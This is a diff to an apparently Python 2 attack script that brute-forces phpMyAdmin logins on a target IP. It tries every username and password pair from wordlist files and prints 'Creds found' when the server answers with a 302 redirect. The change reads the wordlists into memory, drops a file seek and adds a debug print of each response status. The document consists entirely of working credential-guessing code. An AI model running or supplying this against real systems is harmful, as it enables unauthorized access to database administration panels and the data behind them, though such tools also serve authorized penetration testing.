@@ -13,13 +13,16 @@ def tryingCreds(ip_addr,port):
 	
 	print "[*] Trying default phpmyadmin creds on "+ ip_addr
 
-	users = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/users", 'r')
-	passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')
+	f_users = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/users", 'r')
+	f_passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')
 
-	for user in users:
-		user = user[:-1]
-		for pwd in passwds:
-			pwd =pwd[:-1]
+	users = f_users.read()
+	passwds = f_passwds.read()
+
+	for user in (users).split('\n'):
+		#user = user[:-1]
+		for pwd in (passwds).split('\n'):
+			#pwd =pwd[:-1]
 
 
 			params = urllib.urlencode({'pma_username' :user, 'pma_password' : pwd, 'server' :1})
@@ -29,10 +32,10 @@ def tryingCreds(ip_addr,port):
 			conn.request("POST","/", params, headers)
 			res = conn.getresponse()
 			
+			print res.status
 			if res.status == 302:
 				print "[+] Creds found ! "+user+":"+pwd
 
-		passwds.seek(0)
 
 	print "[*] Trying done."
 	
